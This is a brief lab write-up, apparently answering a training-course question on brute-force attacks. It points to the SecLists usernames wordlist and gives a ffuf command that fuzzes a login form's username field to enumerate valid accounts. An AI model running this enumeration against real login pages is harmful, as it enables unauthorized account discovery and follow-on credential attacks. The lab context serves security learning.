# Brute-Force Attacks

### Enumerate a valid user on the web application. Provide the username as the answer.

To complete this assessment we need the SecLists usernames wordlist and a simple ffuf command to brute-force the an application username.

**Step 1 -** Download the SecLists wordlist:

* [xato-net-10-million-usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)

**Step 2 -** Enumerate with ffuf:

* {% code overflow="wrap" %}
  ```bash
  ffuf -w xato-net-10-million-usernames.txt -u http://SERVER_IP:SERVER_PORT/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=random" -fr "Unknown user"
  ```
  {% endcode %}

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After a few seconds we got the username!
